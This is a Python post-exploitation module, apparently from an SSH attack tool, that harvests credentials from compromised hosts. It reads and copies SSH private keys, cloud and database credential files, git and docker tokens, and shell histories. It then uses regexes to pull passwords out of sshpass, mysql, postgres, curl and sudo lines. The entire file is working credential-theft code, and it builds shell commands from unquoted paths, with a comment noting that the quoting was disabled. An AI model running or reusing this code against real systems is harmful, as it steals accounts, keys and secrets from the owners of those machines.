"""Module for harvesting credentials from various sources on the remote host."""
import os
import re
import shlex
from typing import Dict, Any, List, Tuple
from modules.post_exploitation.base_module import BasePostExploitationModule
from modules.logger import sshmap_logger
from modules.utils import sanitize_filename_component


class CredentialHarvesterModule(BasePostExploitationModule):
    """
    Harvests credentials from common locations on the remote host.
    
    Searches for credentials in:
    - Shell history files (.bash_history, .zsh_history, etc.)
    - SSH configuration and keys
    - Configuration files (.netrc, .my.cnf, etc.)
    - Environment files
    """
    
    # Maximum file size to read (50KB)
    MAX_FILE_SIZE = 50000
    
    @property
    def name(self) -> str:
        return "credential_harvester"
    
    @property
    def description(self) -> str:
        return "Harvest credentials from history, config files, and user home directory"
    
    async def execute(self, ssh_session, output_dir: str) -> Dict[str, Any]:
        """Execute credential harvesting on the remote host."""
        try:
            hostname = ssh_session.get_remote_hostname()
            safe_hostname = sanitize_filename_component(hostname)
            sshmap_logger.info(f"[{self.name}] Starting credential harvesting on {hostname}")
            
            results = {
                "success": True,
                "hostname": hostname,
                "data": {
                    "history_files": [],
                    "config_files": [],
                    "ssh_keys": [],
                    "credentials_found": [],
                    "extracted_credentials": []
                },
                "error": None
            }
            
            # Define files to search for
            files_to_check = [
                # Shell history files
                "~/.bash_history",
                "~/.zsh_history",
                "~/.sh_history",
                "~/.history",
                # SSH related
                "~/.ssh/config",
                "~/.ssh/id_rsa",
                "~/.ssh/id_dsa",
                "~/.ssh/id_ecdsa",
                "~/.ssh/id_ed25519",
                "~/.ssh/authorized_keys",
                # Configuration files with potential credentials
                "~/.netrc",
                "~/.my.cnf",
                "~/.pgpass",
                "~/.aws/credentials",
                "~/.config/gcloud/credentials.db",
                "~/.docker/config.json",
                "~/.git-credentials",
                "~/.gitconfig",
                # Environment files
                "~/.bashrc",
                "~/.zshrc",
                "~/.profile",
                "~/.bash_profile",
            ]
            
            # Check which files exist
            for file_path in files_to_check:
                try:
                    # Escape file path to prevent shell injection, breaks with ~
                    # safe_file_path = shlex.quote(file_path)
                    check_cmd = f"test -f {file_path} && echo 'EXISTS' || echo 'NOT_FOUND'"
                    output = await ssh_session.exec_command(check_cmd)
                    
                    if "EXISTS" in output:
                        # Try to read the file (with size limit for safety)
                        read_cmd = f"head -c {self.MAX_FILE_SIZE} {file_path} 2>/dev/null || echo 'PERMISSION_DENIED'"
                        content = await ssh_session.exec_command(read_cmd)

                        if "PERMISSION_DENIED" not in content:
                            # Save the file
                            safe_filename = file_path.replace("/", "_").replace("~", "home")
                            output_file = os.path.join(output_dir, f"{safe_hostname}_{safe_filename}")
                            
                            with open(output_file, "w") as f:
                                f.write(f"# File: {file_path}\n")
                                f.write(f"# Host: {hostname}\n\n")
                                f.write(content)
                            
                            # Categorize the file
                            if "history" in file_path:
                                results["data"]["history_files"].append(file_path)
                                # Parse history for credentials
                                extracted = self._extract_credentials_from_history(content)
                                if extracted:
                                    results["data"]["extracted_credentials"].extend(extracted)
                                    results["data"]["credentials_found"].append(file_path)
                            elif ".ssh/" in file_path:
                                results["data"]["ssh_keys"].append(file_path)
                            else:
                                results["data"]["config_files"].append(file_path)
                            
                            sshmap_logger.debug(f"[{self.name}] Found and saved: {file_path}")
                            
                            # Basic credential pattern detection
                            if self._contains_credentials(content):
                                if file_path not in results["data"]["credentials_found"]:
                                    results["data"]["credentials_found"].append(file_path)
                
                except Exception as e:
                    sshmap_logger.debug(f"[{self.name}] Error checking {file_path}: {e}")
                    continue
            
            # Summary
            total_files = (len(results["data"]["history_files"]) + 
                          len(results["data"]["config_files"]) + 
                          len(results["data"]["ssh_keys"]))
            
            creds_count = len(results["data"]["extracted_credentials"])
            sshmap_logger.display(
                f"[{self.name}] Harvested {total_files} files from {hostname}. "
                f"Found potential credentials in {len(results['data']['credentials_found'])} files. "
                f"Extracted {creds_count} credentials."
            )
            
            # Save extracted credentials to a separate file
            if results["data"]["extracted_credentials"]:
                creds_file = os.path.join(output_dir, f"{safe_hostname}_extracted_credentials.txt")
                with open(creds_file, "w") as f:
                    f.write(f"# Extracted Credentials from {hostname}\n")
                    f.write(f"# Total: {creds_count}\n\n")
                    for cred in results["data"]["extracted_credentials"]:
                        f.write(f"Type: {cred['type']}\n")
                        f.write(f"Source: {cred['source']}\n")
                        if 'username' in cred:
                            f.write(f"Username: {cred['username']}\n")
                        if 'password' in cred:
                            f.write(f"Password: {cred['password']}\n")
                        if 'host' in cred:
                            f.write(f"Host: {cred['host']}\n")
                        if 'command' in cred:
                            f.write(f"Command: {cred['command']}\n")
                        f.write("\n" + "-"*60 + "\n\n")
            
            return results
            
        except Exception as e:
            sshmap_logger.error(f"[{self.name}] Failed to harvest credentials: {e}")
            return {
                "success": False,
                "hostname": hostname if 'hostname' in locals() else "unknown",
                "data": None,
                "error": str(e)
            }
    
    def _contains_credentials(self, content: str) -> bool:
        """Check if content contains potential credential patterns."""
        # Simple pattern matching for common credential indicators
        credential_keywords = [
            "password", "passwd", "pwd", "secret", "token", "api_key",
            "apikey", "access_key", "private_key", "auth", "credential"
        ]
        content_lower = content.lower()
        return any(keyword in content_lower for keyword in credential_keywords)
    
    def _extract_credentials_from_history(self, content: str) -> List[Dict[str, str]]:
        """Extract credentials from shell history content."""
        credentials = []
        lines = content.split('\n')
        
        for i, line in enumerate(lines):
            line = line.strip()
            if not line:
                continue
            
            # Extract from sshpass commands
            # Examples: sshpass -p 'password' ssh user@host
            #           sshpass -p password ssh user@host
            sshpass_match = re.search(r'sshpass\s+-p\s+[\'"]?([^\s\'"]+)[\'"]?\s+ssh\s+(?:([^@]+)@)?(\S+)', line)
            if sshpass_match:
                password = sshpass_match.group(1)
                username = sshpass_match.group(2) if sshpass_match.group(2) else None
                host = sshpass_match.group(3)
                credentials.append({
                    'type': 'sshpass',
                    'source': 'history',
                    'password': password,
                    'username': username,
                    'host': host,
                    'command': line
                })
            
            # Extract from mysql/mariadb commands with password
            # Examples: mysql -u root -pPassword123
            #           mysql -u root -p'Password123'
            mysql_match = re.search(r'mysql.*-u\s+(\S+).*-p[\'"]?([^\s\'"]+)', line)
            if mysql_match:
                username = mysql_match.group(1)
                password = mysql_match.group(2)
                credentials.append({
                    'type': 'mysql',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })
            
            # Extract from psql commands with password in URL
            # Example: psql postgresql://user:password@host/db
            psql_match = re.search(r'postgresql://([^:]+):([^@]+)@(\S+)', line)
            if psql_match:
                username = psql_match.group(1)
                password = psql_match.group(2)
                host = psql_match.group(3)
                credentials.append({
                    'type': 'postgresql',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'host': host,
                    'command': line
                })
            
            # Extract from FTP commands
            # Example: ftp ftp://user:password@host
            ftp_match = re.search(r'ftp://([^:]+):([^@]+)@(\S+)', line)
            if ftp_match:
                username = ftp_match.group(1)
                password = ftp_match.group(2)
                host = ftp_match.group(3)
                credentials.append({
                    'type': 'ftp',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'host': host,
                    'command': line
                })
            
            # Check for passwd command - next line might be password
            if re.match(r'^passwd\s*$', line) or re.match(r'^sudo\s+passwd', line):
                if i + 1 < len(lines):
                    next_line = lines[i + 1].strip()
                    # If next line looks like a password (not a command)
                    if next_line and not next_line.startswith('#') and len(next_line) > 2:
                        # Simple heuristic: passwords typically don't start with common command prefixes
                        if not any(next_line.startswith(cmd) for cmd in ['ls', 'cd', 'cat', 'echo', 'sudo', 'su', 'passwd']):
                            credentials.append({
                                'type': 'passwd_followup',
                                'source': 'history',
                                'password': next_line,
                                'command': f"{line} -> {next_line}"
                            })
            
            # Check for sudo commands - next line might be password
            # But only if the next line is short and doesn't look like another command
            if line.startswith('sudo ') and i + 1 < len(lines):
                next_line = lines[i + 1].strip()
                # Password prompts typically result in the password on the next line in history
                if next_line and not next_line.startswith('sudo') and not next_line.startswith('[sudo]'):
                    # Check if it looks like a password (short, no spaces, not a common command)
                    if len(next_line) <= 50 and ' ' not in next_line:
                        if not any(next_line.startswith(cmd) for cmd in ['ls', 'cd', 'cat', 'echo', 'pwd', 'whoami']):
                            credentials.append({
                                'type': 'sudo_followup',
                                'source': 'history',
                                'password': next_line,
                                'command': f"{line} -> {next_line}"
                            })
            
            # Extract passwords from export/set commands
            # Examples: export PASSWORD=secret123
            #           export DB_PASS="secret123"
            export_match = re.search(r'(?:export|set)\s+(\w*(?:PASS|PASSWORD|PWD|SECRET|TOKEN|KEY)\w*)\s*=\s*[\'"]?([^\s\'"]+)', line, re.IGNORECASE)
            if export_match:
                var_name = export_match.group(1)
                value = export_match.group(2)
                credentials.append({
                    'type': 'environment_variable',
                    'source': 'history',
                    'variable': var_name,
                    'password': value,
                    'command': line
                })
            
            # Extract from curl/wget with basic auth
            # Example: curl -u user:password http://example.com
            curl_auth_match = re.search(r'(?:curl|wget).*-u\s+([^:]+):([^\s]+)', line)
            if curl_auth_match:
                username = curl_auth_match.group(1)
                password = curl_auth_match.group(2)
                credentials.append({
                    'type': 'http_basic_auth',
                    'source': 'history',
                    'username': username,
                    'password': password,
                    'command': line
                })
        
        return credentials
